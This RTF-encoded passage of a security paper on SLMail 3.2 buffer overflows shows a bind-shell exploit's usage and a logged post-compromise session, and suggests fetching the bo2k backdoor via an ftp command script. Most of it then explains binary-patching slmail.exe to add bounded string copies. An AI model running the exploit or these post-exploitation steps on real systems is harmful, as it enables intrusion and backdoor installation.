\par \hich\af1\dbch\af28\loch\f1 by Barnaby Jack AKA dark spyrit <dspyrit@beavuh.org>
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 usage: slxplo\hich\af1\dbch\af28\loch\f1 it <host> <port> <port to bind shell>
\par \hich\af1\dbch\af28\loch\f1 e.g. - slxploit host.com 27 1234
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 waiting for response....
\par \hich\af1\dbch\af28\loch\f1 220 supermax.gen.nz Smtp Server SLMail v3.2 Ready ESMTP spoken here
\par 
\par \hich\af1\dbch\af28\loch\f1 sent.. spawn connection now.
\par 
\par \hich\af1\dbch\af28\loch\f1 Trying 192.168.10.3...
\par \hich\af1\dbch\af28\loch\f1 Connected to supermax.gen.nz.
\par \hich\af1\dbch\af28\loch\f1 Escape character is '^]'.
\par \hich\af1\dbch\af28\loch\f1 Microsoft(R) Windows NT(TM)
\par \hich\af1\dbch\af28\loch\f1 (C) Copyright 1985-1996 Microsoft Corp.
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>at
\par \hich\af1\dbch\af28\loch\f1 The service has not been started.
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>net start schedule
\par 
\par \hich\af1\dbch\af28\loch\f1 The Sched\hich\af1\dbch\af28\loch\f1 ule service is starting.
\par \hich\af1\dbch\af28\loch\f1 The Schedule service was started successfully.
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>time
\par \hich\af1\dbch\af28\loch\f1 The current time is: 23:49:36.36
\par \hich\af1\dbch\af28\loch\f1 Enter the new time:
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>at 23:51:00 net start slmail
\par \hich\af1\dbch\af28\loch\f1 Added a new job with job ID = 0
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>net view
\par \hich\af1\dbch\af28\loch\f1 Server Name            Remark
\par 
\par \hich\af1\dbch\af28\loch\f1 -------------------------------------------------------------------------------
\par \\\\\hich\af1\dbch\af28\loch\f1 SUPERMAX
\par \hich\af1\dbch\af28\loch\f1 The command completed successfully.
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\\hich\af1\dbch\af28\loch\f1 SYSTEM>net send supermax beavuh 99.
\par \hich\af1\dbch\af28\loch\f1 The message was successfully sent to SUPERMAX.
\par 
\par \hich\af1\dbch\af28\loch\f1 E:\\Program Files\\SLmail\\SYSTEM>exit
\par \hich\af1\dbch\af28\loch\f1 exit
\par \hich\af1\dbch\af28\loch\f1 Connection closed by foreign host.
\par 
\par \hich\af1\dbch\af28\loch\f1 Plenty of options, you could also create a file with ftp commands, to\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 download bo2k for exampl\hich\af1\dbch\af28\loch\f1 e, and use NT's console ftp.
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 e.g. ftp -s:file host.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Section 3: The Remedy.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 This is perhaps the most important section of the paper, and is not just\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 useful for preventing vulnerabilities - the ability to add your own code
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 leaves op\hich\af1\dbch\af28\loch\f1 en an endless amount of possibilities as you can imagine.
\par 
\par \hich\af1\dbch\af28\loch\f1 I advise that you have a look at some documentation on the PE file format,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 Matt Peitreks book "Windows 95 System Programming Secrets" has an excellent
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 section, otherwise take a look at\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 http://msdn.\hich\af1\dbch\af28\loch\f1 microsoft.com/library/specs/msdn_pecoff.htm for Microsoft's
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 documentation.
\par 
\par \hich\af1\dbch\af28\loch\f1 Consider this hypothetical situation for a minute:
\par 
\par \hich\af1\dbch\af28\loch\f1 A huge hole is found rendering most NT servers on the internet vulnerable\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 to remote system access.  \hich\af1\dbch\af28\loch\f1 
Microsoft stumbles around for a week or so before\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 releasing a suitable patch, while during this time some of the largest\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
corporations have little to do but pray they won't fall victim to an attack,\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 or make the change to alternative software.  Hey, that hap\hich\af1\dbch\af28\loch\f1 pened a couple of
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 months ago! :)  But there is an alternative, patch the software yourself.
\par 
\par \hich\af1\dbch\af28\loch\f1 There are 3 main approaches we can take to add our own code.
\par 
\par \hich\af1\dbch\af28\loch\f1 1, Add our code to unused space in a section.
\par \hich\af1\dbch\af28\loch\f1 2, Increase the size of the last section.
\par \hich\af1\dbch\af28\loch\f1 3, Add a new \hich\af1\dbch\af28\loch\f1 section.
\par 
\par \hich\af1\dbch\af28\loch\f1 The first is the technique we will use, to see an example of the second\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 approach have a look at my trojan netstat which will be available at\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 http://www.rootkit.com in the near future.
\par 
\par \hich\af1\dbch\af28\loch\f1 Adding your own section - at least as far as what we are doin\hich\af1\dbch\af28\loch\f1 g, won't\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 normally be needed, so I won't cover the techniques in this document.

\par 
\par \hich\af1\dbch\af28\loch\f1 Now we need to think about the code we will add, here's a few options:
\par 
\par \hich\af1\dbch\af28\loch\f1 Add our own string length routine, and print out an error message\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 depending on the length.. then skip th\hich\af1\dbch\af28\loch\f1 e nasty functions.
\par 
\par \hich\af1\dbch\af28\loch\f1 Add our own string length routine, and place a null at the beginning of\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 the buffer depending on the length, so effectively the program thinks\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 there was no input and will return a standard 'syntax error' message.
\par 
\par \hich\af1\dbch\af28\loch\f1 Replace the offending strcpy function with a bounds checking version - i.e.:\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 do what they should have done in the first place.
\par 
\par \hich\af1\dbch\af28\loch\f1 I think it's obvious the approach we will take, the first option would be\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 too involved, the second just isn't delicate - so we'l\hich\af1\dbch\af28\loch\f1 
l go with the last.
\par 
\par \hich\af1\dbch\af28\loch\f1 It just so happens that in this case lstrcpynA is in our targets import\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 table (if this wasn't the case? we would use the same techniques as shown
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 in the shellcode - using the LoadLibrary and GetProcAddress procedures).
\par 
\par \hich\af1\dbch\af28\loch\f1 Grab PE Dump or\hich\af1\dbch\af28\loch\f1  dumpbin, whatever you have on you.. and dump the section\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
table for slmail.exe, if you haven't worked with the PE header before I'll\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 explain a little as we go.
\par 
\par \hich\af1\dbch\af28\loch\f1 Section Table
\par \hich\af1\dbch\af28\loch\f1   01 .text     VirtSize: 0003F99B  VirtAddr:  00001000
\par \hich\af1\dbch\af28\loch\f1     raw data offs:   0000\hich\af1\dbch\af28\loch\f1 1000  raw data size: 00040000
\par \hich\af1\dbch\af28\loch\f1     relocation offs: 00000000  relocations:   00000000
\par \hich\af1\dbch\af28\loch\f1     line # offs:     00000000  line #'s:      00000000
\par \hich\af1\dbch\af28\loch\f1     characteristics: 60000020
\par \hich\af1\dbch\af28\loch\f1       CODE  MEM_EXECUTE  MEM_READ
\par 
\par \hich\af1\dbch\af28\loch\f1 The section we will be working with is the .text s\hich\af1\dbch\af28\loch\f1 ection - where the code\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
is located.  We can see here that the Virtual Size (the actual size of the\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 code) is somewhat smaller than the raw data size (the amount of space that is\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 actually taken up).  So if we subtract the Virtual Size from the raw data\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 size :
\par 
\par \hich\af1\dbch\af28\loch\f1 0x40000 - 0x3f99b = 0x665
\par 
\par \hich\af1\dbch\af28\loch\f1 That gives us about 1.6k to play with, easily enough space for what we want to\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 do.
\par 
\par \hich\af1\dbch\af28\loch\f1 Why do we have this extra space? 
\par 
\par \hich\af1\dbch\af28\loch\f1 Because compilers usually round up the size to align the section, which is\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 handy for us :)
\par 
\par \hich\af1\dbch\af28\loch\f1 Fire up yo\hich\af1\dbch\af28\loch\f1 ur hex editor, and jump to the address 0x4099b (virtual size +\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
raw data offset) and you'll notice we have a ton of null bytes, about 1.6k\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 worth in fact.  This is a perfect place to dump our code - but before we do..
\par 
\par \hich\af1\dbch\af28\loch\f1 We need to increase the Virtual Size to\hich\af1\dbch\af28\loch\f1  allow for our code, we may as well\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
increase it to the largest available size, it won't hurt.  We also need to\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 modify the flags, as you saw from the dump the .text section is defined code,\hich\af1\dbch\af28\loch\f1  
\hich\af1\dbch\af28\loch\f1 readable and executable.
\par 
\par \hich\af1\dbch\af28\loch\f1 The values are as follows:
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 IMAGE_SCN_CN\hich\af1\dbch\af28\loch\f1 T_CODE\tab equ       000000020h  
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 IMAGE_SCN_MEM_EXECUTE\tab equ       020000000h  
\par \hich\af1\dbch\af28\loch\f1 IMAGE_SCN_MEM_READ      equ       040000000h 
\par 
\par \hich\af1\dbch\af28\loch\f1 To get the final value we OR each of the flags, which results in 060000020h.
\par 
\par \hich\af1\dbch\af28\loch\f1 But, if we wish to write data to our code space, to avoid page faults we also\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 need to make the section writeable - we may not have the need, but it doesn't
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 hurt to change the flags anyway.
\par 
\par \hich\af1\dbch\af28\loch\f1 IMAGE_SCN_MEM_WRITE     equ       080000000h
\par 
\par \hich\af1\dbch\af28\loch\f1 So we OR this valu\hich\af1\dbch\af28\loch\f1 e with 060000020h and we get 0E0000020h.  This is the new\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 value we will add to the exe.
\par \hich\af1\dbch\af28\loch\f1  
\par \hich\af1\dbch\af28\loch\f1 Jump back into the hex editor and we'll make these changes permanent, to find\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 the Virtual Size value for the .text section, simply do a search for .text
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 and the follo\hich\af1\dbch\af28\loch\f1 wing value is the culprit.
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 000001D0  00 00 00 00 00 00 00 00-2E 74 65 78 74 00 00 00   .........text...
\par \hich\af1\dbch\af28\loch\f1 000001E0  9B F9 03 00  <====                                ....
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 To set this to the maximum allowed value we just replace with the raw data
\par \hich\af1\dbch\af28\loch\f1 size:
\par 
\par \hich\af1\dbch\af28\loch\f1 000001E0  00 00 04 00 
\par 
\par \hich\af1\dbch\af28\loch\f1 And, we also make the change to the flags.
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 000001D0  00 00 00 00 00 00 00 00-2E 74 65 78 74 00 00 00   .........text...
\par \hich\af1\dbch\af28\loch\f1 000001E0  9B F9 03 00 00 10 00 00-00 00 04 00 00 10 00 00   ................
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 000001F0  00 00 00 00 00 00 00 00-00 00 00 00 20 00 00 60   <=====
\par 
\par \hich\af1\dbch\af28\loch\f1 We replace with our new value that allows us to write to the code space:
\par 
\par \hich\af1\dbch\af28\loch\f1 000001F0  00 00 00 00 00 00 00 00-00 00 00 00 20 00 00 E0
\par 
\par \hich\af1\dbch\af28\loch\f1 We'll quickly verify our changes with PE Dump, then \hich\af1\dbch\af28\loch\f1 we can actually get to\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 what we're here for, getting our code executing.
\par 
\par \hich\af1\dbch\af28\loch\f1 Section Table
\par \hich\af1\dbch\af28\loch\f1   01 .text     VirtSize: 00040000  VirtAddr:  00001000
\par \hich\af1\dbch\af28\loch\f1     raw data offs:   00001000  raw data size: 00040000
\par \hich\af1\dbch\af28\loch\f1     relocation offs: 00000000  relocations:   00000000
\par \hich\af1\dbch\af28\loch\f1    \hich\af1\dbch\af28\loch\f1  line # offs:     00000000  line #'s:      00000000
\par \hich\af1\dbch\af28\loch\f1     characteristics: E0000020
\par \hich\af1\dbch\af28\loch\f1       CODE  MEM_EXECUTE  MEM_READ  MEM_WRITE
\par 
\par \hich\af1\dbch\af28\loch\f1 And there we have it, our virtual size equals the raw data size, and we now\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 also have the writeable flag.
\par 
\par \hich\af1\dbch\af28\loch\f1 What we need to do now, is find a location to jump to our own code. 
\par 
\par \hich\af1\dbch\af28\loch\f1 004364AE                 push    edi
\par \hich\af1\dbch\af28\loch\f1 004364AF                 push    eax ; we jump here.
\par \hich\af1\dbch\af28\loch\f1 004364B0                 push    esi
\par \hich\af1\dbch\af28\loch\f1 004364B1                 call    ds:lstrcpyA
\par 
\par \hich\af1\dbch\af28\loch\f1 We'll get r\hich\af1\dbch\af28\loch\f1 id of the strcpy call, and make a jump to our code at the 'push\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
eax'.  We know our code resides at RVA (relative virtual address) 0x4099b\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 so we make our jump.  We can assemble our jumps in tasm:
\par 
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 jmp $+(04099bh-0364afh)
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 (RVA of our code - RVA of current l\hich\af1\dbch\af28\loch\f1 ocation)
\par 
\par \hich\af1\dbch\af28\loch\f1 Or, we can do it straight from the debugger.
\par 
\par 
\par \hich\af1\dbch\af28\loch\f1 Let's make it perm.. the code follows:
\par 
\par \hich\af1\dbch\af28\loch\f1 :004364AA 8B742478                mov esi, dword ptr [esp+78]
\par \hich\af1\dbch\af28\loch\f1 :004364AE 57                      push edi
\par \hich\af1\dbch\af28\loch\f1 :004364AF E9E7A40000              jmp 0044099B     ;j\hich\af1\dbch\af28\loch\f1 ump to our code
\par 
\par \hich\af1\dbch\af28\loch\f1 * Referenced by a (U)nconditional or (C)onditional Jump at Address:
\par \hich\af1\dbch\af28\loch\f1 |:004409A9(U)
\par \hich\af1\dbch\af28\loch\f1 |
\par \hich\af1\dbch\af28\loch\f1 :004364B4 59                      pop ecx          ;restore ecx on return
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :004364B5 90                      nop
\par \hich\af1\dbch\af28\loch\f1 :004364B6 90                      nop
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 *\hich\af1\dbch\af28\loch\f1  Referenced by a (U)nconditional or (C)onditional Jump at Address:
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 |:004364AF(U)
\par \hich\af1\dbch\af28\loch\f1 |
\par \hich\af1\dbch\af28\loch\f1 :0044099B 51                      push ecx          ;preserve ecx
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :0044099C 52                      push edx          ;preserve edx
\par \hich\af1\dbch\af28\loch\f1 :0044099D E800000000              call 00\hich\af1\dbch\af28\loch\f1 4409A2
\par 
\par \hich\af1\dbch\af28\loch\f1 * Referenced by a CALL at Address:
\par \hich\af1\dbch\af28\loch\f1 |:0044099D   
\par \hich\af1\dbch\af28\loch\f1 |
\par \hich\af1\dbch\af28\loch\f1 :004409A2 5A                      pop edx           ;get eip
\par \hich\af1\dbch\af28\loch\f1 :004409A3 81EAA2090400            sub edx, 000409A2 ;get image base
\par \hich\af1\dbch\af28\loch\f1 :004409A9 81C264110400            add edx, 00041164 ;point to strcpy\hich\af1\dbch\af28\loch\f1 n
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 :004409AF 33C9                    xor ecx, ecx
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 :004409B1 B160                    mov cl, 60        ;allow 96 bytes 
\par \hich\af1\dbch\af28\loch\f1 :004409B3 51                      push ecx
\par \hich\af1\dbch\af28\loch\f1 :004409B4 50                      push eax          ;our input
\par \hich\af1\dbch\af28\loch\f1 :004409B5 56                    \hich\af1\dbch\af28\loch\f1   push esi          ;buffer 
\par \hich\af1\dbch\af28\loch\f1 :004409B6 FF12                    call dword ptr [edx]  ;call strcpyn 
\par \hich\af1\dbch\af28\loch\f1 :004409B8 5A                      pop edx             ;restore edx
\par \hich\af1\dbch\af28\loch\f1 :004409B9 E9F65AFFFF              jmp 004364B4        ;back to proggie.
\par 
\par \hich\af1\dbch\af28\loch\f1 Yeah, I know, W32Dasm - but hey, its fast and easy for showing code dumps\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 :)
\par 
\par \hich\af1\dbch\af28\loch\f1 The stack pointer is basically kept in tact, so we don't need to worry about\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 screwing with it.
\par 
\par \hich\af1\dbch\af28\loch\f1 Now, this should have solved our problem - let's check.
\par 
\par \hich\af1\dbch\af28\loch\f1 220 supermax.gen.nz Smtp \hich\af1\dbch\af28\loch\f1 Server SLMail v3.2 Ready ESMTP spoken here\hich\af1\dbch\af28\loch\f1  
\par \hich\af1\dbch\af28\loch\f1 expn <10 or so lines of x's>
\par 
\par \hich\af1\dbch\af28\loch\f1 Connection closed by foreign host.
\par 
\par \hich\af1\dbch\af28\loch\f1 Whoops, the slmail process dies.
\par 
\par \hich\af1\dbch\af28\loch\f1 Guess what? there's another overflow.  This software is shocking, widely\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 used shocking software might I add.  Wel\hich\af1\dbch\af28\loch\f1 l, let us fix this one also.

\par 
\par \hich\af1\dbch\af28\loch\f1 A couple of rets, and we quickly find the offending code:
\par 
\par \hich\af1\dbch\af28\loch\f1 00404bb1\tab mov\tab esi, eax
\par \hich\af1\dbch\af28\loch\f1 00404bb3\tab push\tab edi\tab 
\par \hich\af1\dbch\af28\loch\f1 00404bb4\tab push\tab ecx\tab 
\par \hich\af1\dbch\af28\loch\f1 00404bb5\tab call\tab [KERNEL32!lstrcpy]
\par 
\par \hich\af1\dbch\af28\loch\f1 edi contains our input, ecx the buffer.
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we go again.
\par 
\par \hich\af1\dbch\af28\loch\f1 We'll put our code directly after our earlier modifications (0x409be), and\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 we'll kill this strcpy call and jump to our code at 'push edi'.
\par 
\par \hich\af1\dbch\af28\loch\f1 :00404BB1 8BF0                    mov esi, eax
\par \hich\af1\dbch\af28\loch\f1 :00404BB3 E906BE0300              jmp 004409BE  ;jump to our code
\par 
\par \hich\af1\dbch\af28\loch\f1 *\hich\af1\dbch\af28\loch\f1  Referenced by a (U)nconditional or (C)onditional Jump at Address:
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 |:004409E0(U)
\par \hich\af1\dbch\af28\loch\f1 |
\par \hich\af1\dbch\af28\loch\f1 :00404BB8 90                      nop
\par \hich\af1\dbch\af28\loch\f1 :00404BB9 90                      nop
\par \hich\af1\dbch\af28\loch\f1 :00404BBA 90                      nop
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 * Referenced by a (U)nconditional or (C)onditional Jump at\hich\af1\dbch\af28\loch\f1  Address:
\par \hich\af1\dbch\af28\loch\f1 |:00404BB3(U)
\par \hich\af1\dbch\af28\loch\f1 |
\par \hich\af1\dbch\af28\loch\f1 :004409BE 90                      nop
\par \hich\af1\dbch\af28\loch\f1 :004409BF 52                      push edx        ;preserve edx
\par \hich\af1\dbch\af28\loch\f1 :004409C0 E800000000              call 004409C5
\par 
\par \hich\af1\dbch\af28\loch\f1 * Referenced by a CALL at Address:
\par \hich\af1\dbch\af28\loch\f1 |:004409C0   
\par \hich\af1\dbch\af28\loch\f1 |
\par \hich\af1\dbch\af28\loch\f1 :004409C5 5A                \hich\af1\dbch\af28\loch\f1       pop edx\tab      ;get eip
\par \hich\af1\dbch\af28\loch\f1 :004409C6 81EAC5090400            sub edx, 000409C5  ;get image base
\par \hich\af1\dbch\af28\loch\f1 :004409CC 81C264110400            add edx, 00041164  ;address for strcpyn
\par \hich\af1\dbch\af28\loch\f1 :004409D2 33C0                    xor eax, eax
\par \hich\af1\dbch\af28\loch\f1 :004409D4 B060                    mov al, 60         ;allow 96 byes
\par \hich\af1\dbch\af28\loch\f1 :004409D6 50                      push eax 
\par \hich\af1\dbch\af28\loch\f1 :004409D7 57                      push edi           ;input
\par \hich\af1\dbch\af28\loch\f1 :004409D8 51                      push ecx           ;buffer
\par \hich\af1\dbch\af28\loch\f1 :004409D9 FF12         \hich\af1\dbch\af28\loch\f1            call dword ptr [edx]  ;call strcpyn
\par \hich\af1\dbch\af28\loch\f1 :004409DB 5A                      pop edx \tab \tab ;restore edx
\par \hich\af1\dbch\af28\loch\f1 :004409DC C6476000                mov [edi+60], 00\tab ;cut the goddamn
\par \hich\af1\dbch\af28\loch\f1                                                         ;input short,
\par \hich\af1\dbch\af28\loch\f1               \hich\af1\dbch\af28\loch\f1                                           ;incase there is 
\par \hich\af1\dbch\af28\loch\f1                                                         ;even more overflows 
\par \hich\af1\dbch\af28\loch\f1 :004409E0 E9D341FCFF              jmp 00404BB8 ;return to the prog.
\par 
\par \hich\af1\dbch\af28\loch\f1 This time...
\par 
\par \hich\af1\dbch\af28\loch\f1 220 supermax.gen.nz Smtp Server SL\hich\af1\dbch\af28\loch\f1 Mail v3.2 Ready ESMTP spoken here
\par \hich\af1\dbch\af28\loch\f1 expn xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\hich\af1\dbch\af28\loch\f1 xx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxx\hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 550 Unable to find list 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
\par \hich\af1\dbch\af28\loch\f1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'.
\par \hich\af1\dbch\af28\loch\f1 quit
\par \hich\af1\dbch\af28\loch\f1 221 supermax.gen.nz Service Closing
\par \hich\af1\dbch\af28\loch\f1 Connection closed by foreign host.
\par 
\par \hich\af1\dbch\af28\loch\f1 And so it was done, 15 minutes work and we've fixed a\hich\af1\dbch\af28\loch\f1  terribly serious hole.
\par 
\par \hich\af1\dbch\af28\loch\f1 No source? no problem.
\par 
\par \hich\af1\dbch\af28\loch\f1 The binary for this quick patch will be available at http://www.beavuh.org, 
\par \hich\af1\dbch\af28\loch\f1 although, a vendor patch is seriously recommended.
\par 
\par \hich\af1\dbch\af28\loch\f1 This will prevent break-ins from the exploit that accompanies this paper,
\par \hich\af1\dbch\af28\loch\f1 but \hich\af1\dbch\af28\loch\f1 there are far too many exploitable holes in this software - and no
\par \hich\af1\dbch\af28\loch\f1 doubt after reading this other exploits are in the works.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Conclusion.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 Windows 9x/NT has a had a relatively easy ride as far as buffer overflows go -\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 a change is coming.  Alth\hich\af1\dbch\af28\loch\f1 
ough some "big" software has been affected as of\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 late, the limitations of the payload and the system dependency limited the\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 wide-scale fear.

\par 
\par \hich\af1\dbch\af28\loch\f1 It's time to recognize.
\par 
\par \hich\af1\dbch\af28\loch\f1 The fact that I picked on 3rd party software for this article, rather than\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 hitting the giant itself, is not because of lack of opportunities \loch\af1\dbch\af28\hich\f1 
